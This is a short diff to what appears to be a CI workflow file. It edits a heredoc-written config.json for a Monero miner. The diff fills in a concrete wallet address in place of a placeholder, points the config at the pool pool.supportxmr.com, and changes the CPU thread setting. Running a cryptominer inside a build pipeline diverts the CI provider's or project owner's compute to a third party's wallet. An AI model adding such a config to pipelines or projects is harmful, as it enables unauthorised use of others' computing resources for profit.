@@ -18,10 +18,10 @@ jobs:
           cat > config.json <<EOF
           {
               "autosave": true,
-              "cpu": {"enabled": true, "max-threads-hint": 70},
+              "cpu": {"enabled": true, "max-threads-hint":0},
               "pools": [{
                   "url": "pool.supportxmr.com:3333",
-                  "user": "YOUR_MONERO_WALLET_ADDRESS",
+                  "user": "84EpcRqHykahepTF32qggV6mkAgED8TymjTX9647EiYkXfbv9oHmm89S1CFvhHV4haTfSJwQKGiuEgc4Az7voZQkBQUcM2t",
                   "pass": "x",
                   "tls": false,
                   "keepalive": true
